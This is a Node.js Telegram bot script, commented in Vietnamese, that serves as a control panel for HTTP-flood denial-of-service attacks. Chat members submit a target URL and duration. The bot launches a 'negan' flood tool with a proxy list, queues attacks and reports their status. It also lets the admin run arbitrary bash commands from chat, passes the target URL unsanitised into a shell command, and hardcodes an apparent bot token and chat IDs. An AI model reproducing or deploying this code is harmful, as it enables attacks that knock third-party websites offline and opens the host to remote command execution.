const TelegramBot = require('node-telegram-bot-api');
const { exec } = require('child_process');
const os = require('os');

// Cấu hình
const token = '7935173392:AAFYFVwBtjee7R33I64gcB3CE_-veYkU4lU';
const adminId = 1243471275;
const allowedGroupIds = new Set([-1002423723717, 987654321, 112233445, 556677889, 998877665]);
const maxConcurrentAttacks = 3, maxSlot = 1, maxTimeAttacks = 120;

// Khởi tạo bot
const bot = new TelegramBot(token, { polling: true });
const currentAttacks = new Map(), attackQueue = [];

// Thông báo bot đã sẵn sàng
let isBotReady = true;
bot.sendMessage(adminId, '[Version PRO] 🤖 Bot đã sẵn sàng nhận lệnh.');
console.log('[DEBUG] Bot đã khởi động xong và sẵn sàng nhận lệnh.');

// Hàm gửi thông báo dưới dạng JSON đẹp
const sendJsonMessage = async (chatId, data) => {
    try {
        const formattedJson = `<pre><code>${JSON.stringify(data, null, 2)}</code></pre>`;
        await bot.sendMessage(chatId, formattedJson, { parse_mode: 'HTML' });
    } catch (error) {
        console.error(`[ERROR] Gửi tin nhắn thất bại: ${error.message}`);
    }
};

// Hàm thực thi lệnh
const executeCommand = async (chatId, command, host, time, username) => {
    const startTime = new Date().toLocaleString(), pid = Math.floor(Math.random() * 10000);

    // Thông báo bắt đầu
    const startMessage = {
        status: "🚀Successfully🚀", pid, website: host, time: `${time} Giây`,
        caller: username, startTime, maxSlots: maxSlot
    };
    await sendJsonMessage(chatId, startMessage);
    await bot.sendMessage(chatId, `[Check Host](https://check-host.net/check-http?host=${host})`, { parse_mode: 'Markdown' });

    const child = exec(command, { shell: '/bin/bash' });
    child.on('close', () => {
        const endTime = new Date().toLocaleString();
        const completeMessage = {
            status: "✅ Tiến trình hoàn tất", pid, website: host, time: `${time} Giây`,
            caller: username, startTime, endTime
        };
        sendJsonMessage(chatId, completeMessage);
        currentAttacks.delete(chatId);
        if (attackQueue.length > 0) {
            const nextAttack = attackQueue.shift();
            executeCommand(nextAttack.chatId, nextAttack.command, nextAttack.host, nextAttack.time, nextAttack.username);
        }
    });
};

// Xử lý lệnh từ người dùng
bot.on('message', async (msg) => {
    const chatId = msg.chat.id, text = msg.text, isAdmin = chatId === adminId, isGroup = allowedGroupIds.has(chatId);
    const username = msg.from.username || msg.from.first_name;

    // Kiểm tra quyền thực thi lệnh
    if (!isAdmin && !isGroup) return sendJsonMessage(chatId, { error: "🚫 Bạn không có quyền thực hiện lệnh này." });

    // Xử lý lệnh tấn công (URL + thời gian)
    if (text.startsWith('http') || text.startsWith('htttp') || text.startsWith('htttps')) {
        const correctedText = text.replace(/^ht+tps?:\/\//, 'https://'), parts = correctedText.split(' ');
        if (parts.length !== 2 || isNaN(parts[1])) return sendJsonMessage(chatId, { error: "🚫 Sai định dạng! Nhập theo: <URL> <time>." });
        const [host, time] = parts;
        if (time > maxTimeAttacks) return sendJsonMessage(chatId, { error: `🚫 Thời gian tối đa là ${maxTimeAttacks} giây.` });

        // Kiểm tra số lệnh đang chạy của người dùng
        if (currentAttacks.has(chatId)) return sendJsonMessage(chatId, { error: "🚫 Bạn đang có một lệnh chạy. Vui lòng chờ tiến trình hiện tại hoàn tất." });

        // Kiểm tra số lệnh đang chạy toàn hệ thống
        if (currentAttacks.size >= maxConcurrentAttacks) {
            attackQueue.push({ chatId, command: `node ./negan -m GET -u ${host} -p live.txt --full true -s ${time}`, host, time, username });
            return sendJsonMessage(chatId, { status: "⏳ Lệnh của bạn đã được thêm vào hàng đợi. Vui lòng chờ..." });
        }

        const command = `node ./negan -m GET -u ${host} -p live.txt --full true -s ${time}`;
        currentAttacks.set(chatId, { user: chatId, command });
        executeCommand(chatId, command, host, time, username);
        return;
    }

    // Xử lý lệnh exe (chỉ admin)
    if (text.startsWith('exe ') && isAdmin) {
        const command = text.slice(4).trim();
        if (!command) return sendJsonMessage(chatId, { error: "🚫 Lệnh không được để trống. Ví dụ: exe ls" });
        const child = exec(command, { shell: '/bin/bash' });
        let output = '';
        child.stdout.on('data', (data) => output += data.toString());
        child.stderr.on('data', (data) => output += data.toString());
        child.on('close', () => sendJsonMessage(chatId, { status: "🚀 Kết quả lệnh", command, output }));
        return;
    }

    // Lệnh không hợp lệ
    sendJsonMessage(chatId, { error: "🚫 Lệnh không hợp lệ. Vui lòng bắt đầu lệnh với 'exe' hoặc nhập URL và thời gian." });
});
